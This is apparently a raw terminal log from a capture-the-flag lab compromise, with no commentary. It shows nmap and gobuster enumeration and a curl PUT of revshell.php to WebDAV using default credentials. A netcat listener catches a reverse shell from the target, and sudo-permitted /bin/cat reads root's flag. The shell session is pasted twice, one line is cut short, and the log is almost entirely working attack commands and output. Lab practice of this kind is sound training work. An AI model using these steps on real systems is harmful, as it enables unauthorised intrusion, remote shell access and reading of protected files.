
```nmap -A -v 10.10.132.6 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-12 13:56 CDT
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 13:56
Completed NSE at 13:56, 0.00s elapsed
Initiating NSE at 13:56
Completed NSE at 13:56, 0.00s elapsed
Initiating NSE at 13:56
Completed NSE at 13:56, 0.00s elapsed
Initiating Ping Scan at 13:56
Scanning 10.10.132.6 [4 ports]
Completed Ping Scan at 13:56, 0.21s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 13:56
Completed Parallel DNS resolution of 1 host. at 13:56, 0.01s elapsed
Initiating SYN Stealth Scan at 13:56
Scanning 10.10.132.6 [1000 ports]
Discovered open port 80/tcp on 10.10.132.6
Completed SYN Stealth Scan at 13:56, 3.42s elapsed (1000 total ports)
Initiating Service scan at 13:56
Scanning 1 service on 10.10.132.6
Completed Service scan at 13:56, 6.46s elapsed (1 service on 1 host)
Initiating OS detection (try #1) against 10.10.132.6
Initiating Traceroute at 13:56
Completed Traceroute at 13:56, 0.15s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 13:56
Completed Parallel DNS resolution of 2 hosts. at 13:56, 0.01s elapsed
NSE: Script scanning 10.10.132.6.
Initiating NSE at 13:56
Completed NSE at 13:56, 3.22s elapsed
Initiating NSE at 13:56
Completed NSE at 13:56, 0.62s elapsed
Initiating NSE at 13:56
Completed NSE at 13:56, 0.00s elapsed
Nmap scan report for 10.10.132.6
Host is up (0.12s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.4
OS details: Linux 4.4
Uptime guess: 0.000 days (since Sat Jul 12 13:56:17 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=257 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE (using port 199/tcp)
HOP RTT       ADDRESS
1   150.23 ms 10.23.0.1
2   151.14 ms 10.10.132.6

NSE: Script Post-scanning.
Initiating NSE at 13:56
Completed NSE at 13:56, 0.00s elapsed
Initiating NSE at 13:56
Completed NSE at 13:56, 0.00s elapsed
Initiating NSE at 13:56
Completed NSE at 13:56, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.99 seconds
           Raw packets sent: 1227 (54.774KB) | Rcvd: 1127 (50.950KB)
                                                                                                                    
┌──(guts㉿TORFF)-[~]
└─$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u 10.10.132.6
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.132.6
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 290]
/.htpasswd            (Status: 403) [Size: 295]
/.htaccess            (Status: 403) [Size: 295]
/index.html           (Status: 200) [Size: 11321]
/server-status        (Status: 403) [Size: 299]
/webdav               (Status: 401) [Size: 458]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
=========================================================

curl --user "wampp:xampp" http://10.10.132.6/webdav/ --upload-file revshell.php -v
*   Trying 10.10.132.6:80...
* Connected to 10.10.132.6 (10.10.132.6) port 80
* using HTTP/1.x
* Server auth using Basic with user 'wampp'
> PUT /webdav/revshell.php HTTP/1.1
> Host: 10.10.132.6
> Authorization: Basic d2FtcHA6eGFtcHA=
> User-Agent: curl/8.14.1
> Accept: */*
> Content-Length: 1113
> 
* upload completely sent off: 1113 bytes
< HTTP/1.1 201 Created
< Date: Sat, 12 Jul 2025 19:11:23 GMT
< Server: Apache/2.4.18 (Ubuntu)
< Location: http://10.10.132.6/webdav/revshell.php
< Content-Length: 271
< Content-Type: text/html; charset=ISO-8859-1
< 
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>201 Created</title>
</head><body>
<h1>Created</h1>
<p>Resource /webdav/revshell.php has been created.</p>
<hr />
<address>Apache/2.4.18 (Ubuntu) Server at 10.10.132.6 Port 80</address>
</body></html>
* Connection #0 to host 10.10.132.6 left intact

nc -lvnp 4444                                                                     
listening on [any] 4444 ...
connect to [10.23.140.77] from (UNKNOWN) [10.10.132.6] 33526
bash: cannot set terminal process group (715): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/var/www/html/webdav$ id 
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@ubuntu:/var/www/html/webdav$ ls -la
ls -la
total 16
drwxr-xr-x 2 www-data root     4096 Jul 12 12:18 .
drwxr-xr-x 3 root     root     4096 Aug 25  2019 ..
-rw-r----- 1 www-data www-data   44 Aug 25  2019 passwd.dav
-rw-r--r-- 1 www-data www-data   76 Jul 12 12:18 revshell.php
www-data@ubuntu:/var/www/html/webdav$ ls /home
ls /home
merlin
wampp
www-data@ubuntu:/var/www/html/webdav$ sudo -l
sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: /bin/cat
www-data@ubuntu:/var/www/html/webdav$ cd merlin 
cd merlin 
bash: cd: merlin: No such file or directory
www-data@ubuntu:/var/www/html/webdav$ cd /home/merlin         
cd /home/merlin
www-data@ubuntu:/home/merlin$ cat user.txt
cat user.txt
449b40fe93f78a938523b7e4dcd66d2a
www-data@ubuntu:/home/merlin$ cat /root/root.txt
cat /root/root.txt
cat: /root/root.txt: Permission denied
www-data@ubuntu:/home/merlin$ cd
cd
bash: cd: HOME not set
www-data@ubuntu:/home/merlin$ cd..
cd..
cd..: command not found
www-data@ubuntu:/home/merlin$ cd ..   
cd ..
www-data@ubuntu:/home$ cd ..
cd ..
www-data@ubuntu:/$ sudo -l
sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: /bin/cat
www-data@ubuntu:/$ /bin/cat /root/root.txt
/bin/cat /root/root.txt
/bin/cat: /root/root.txt: Permission denied
www-data@ubuntu:/$ sudo /bin/cat /root/root.txt
sudo /bin/cat /root/root.txt
101101ddc16b0cdf65ba0b8a7af7afa5
www-data@ubuntu:/$ nc -lvnp 4444                                                                     
listening on [any] 4444 ...
connect to [10.23.140.77] from (UNKNOWN) [10.10.132.6] 33526
bash: cannot set terminal process group (715): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/var/www/html/webdav$ id 
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@ubuntu:/var/www/html/webdav$ ls -la
ls -la
total 16
drwxr-xr-x 2 www-data root     4096 Jul 12 12:18 .
drwxr-xr-x 3 root     root     4096 Aug 25  2019 ..
-rw-r----- 1 www-data www-data   44 Aug 25  2019 passwd.dav
-rw-r--r-- 1 www-data www-data   76 Jul 12 12:18 revshell.php
www-data@ubuntu:/var/www/html/webdav$ ls /home
ls /home
merlin
wampp
www-data@ubuntu:/var/www/html/webdav$ sudo -l
sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: /bin/cat
www-data@ubuntu:/var/www/html/webdav$ cd merlin 
cd merlin 
bash: cd: merlin: No such file or directory
www-data@ubuntu:/var/www/html/webdav$ cd /home/merlin         
cd /home/merlin
www-data@ubuntu:/home/merlin$ cat user.txt
cat user.txt
449b40fe93f78a938523b7e4dcd66d2a
www-data@ubuntu:/home/merlin$ cat /root/root.txt
cat /root/root.txt
cat: /root/root.txt: Permission denied
www-data@ubuntu:/home/merlin$ cd
cd
bash: cd: HOME not set
www-data@ubuntu:/home/merlin$ cd..
cd..
cd..: command not found
www-data@ubuntu:/home/merlin$ cd ..   
cd ..
www-data@ubuntu:/home$ cd ..
cd ..
www-data@ubuntu:/$ sudo -l
sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbi

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: /bin/cat
www-data@ubuntu:/$ /bin/cat /root/root.txt
/bin/cat /root/root.txt
/bin/cat: /root/root.txt: Permission denied
www-data@ubuntu:/$ sudo /bin/cat /root/root.txt
sudo /bin/cat /root/root.txt
101101ddc16b0cdf65ba0b8a7af7afa5
```
